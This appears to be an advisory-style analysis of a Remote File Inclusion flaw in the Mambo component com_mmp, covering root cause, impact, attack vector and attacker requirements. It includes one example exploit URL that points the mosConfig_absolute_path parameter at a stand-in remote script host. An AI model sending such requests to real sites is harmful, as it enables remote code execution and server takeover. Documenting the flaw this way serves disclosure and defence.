```
- Root cause of vulnerability: The Mambo component `com_mmp` is vulnerable to Remote File Inclusion (RFI) due to the insecure use of the `mosConfig_absolute_path` variable in the `help.mmp.php` file. This variable is not properly sanitized, allowing an attacker to inject a remote URL, which leads to arbitrary code execution.

- Weaknesses/vulnerabilities present:
    - Remote File Inclusion (RFI): The `help.mmp.php` script includes the `diagnostics.mmp.php` file using a path derived from the user-supplied `mosConfig_absolute_path` parameter without proper sanitization or validation.
    - Lack of input validation: The application fails to properly validate and sanitize the `mosConfig_absolute_path` parameter before using it in a file inclusion operation.

- Impact of exploitation: Successful exploitation allows an attacker to include and execute arbitrary PHP code from a remote server, leading to:
    - Arbitrary code execution on the server
    - Full compromise of the affected web application and the server it is hosted on
    - Potential data theft or modification
    - Denial of service

- Attack vectors:
    - The vulnerability is triggered by sending a crafted HTTP GET request to the `help.mmp.php` file with a malicious URL provided in the `mosConfig_absolute_path` parameter.
    - Example: `http://www.site.com/[path]/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=http://site.com/evilscript.txt?`

- Required attacker capabilities/position:
    - The attacker needs to be able to send HTTP requests to the vulnerable Mambo installation.
    - The attacker needs to have a web server to host the malicious PHP script.
    - No authentication is required to exploit the vulnerability.
